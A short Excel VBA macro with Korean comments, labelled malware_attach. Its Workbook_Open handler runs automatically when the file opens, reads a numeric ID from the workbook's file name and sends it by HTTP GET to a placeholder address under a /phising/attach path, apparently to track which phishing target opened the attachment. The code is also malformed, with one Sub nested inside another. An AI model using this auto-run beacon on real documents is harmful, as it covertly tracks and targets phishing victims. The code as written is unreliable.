```vbscript
Sub malware_attach()

    '통합문서 열 때 자동으로 실행  - 선언'
Private Sub Workbook_Open()

Dim tmpName As String, myIndex As String
'used to get the name of the active workbook from n different number of opened workbooks.'
'tmpName = ActiveWorkbook.Name'
tmpName = Thisworkbook.Name

'-의 첫번째 출현 위치가 0보다 클 때'
If InStr(tmpName, "_") > 0 Then
    '문자열의 왼쪽에서 지정한 수의 문자를 반환'
    myIndex = Left$(tmpName, InStr(tmpName, "_") - 1)

    If Val(myIndex) <> 0 Then
        Set hReq = CreateObject("MSXML2.XMLHTTP")
                'HTTP 서버에 연결'
        With hReq
            .Open "GET", "주소:포트/phising/attach?변수=" & Val(myIndex), False
            .Send
        End With
    End If
End If
End Sub

```

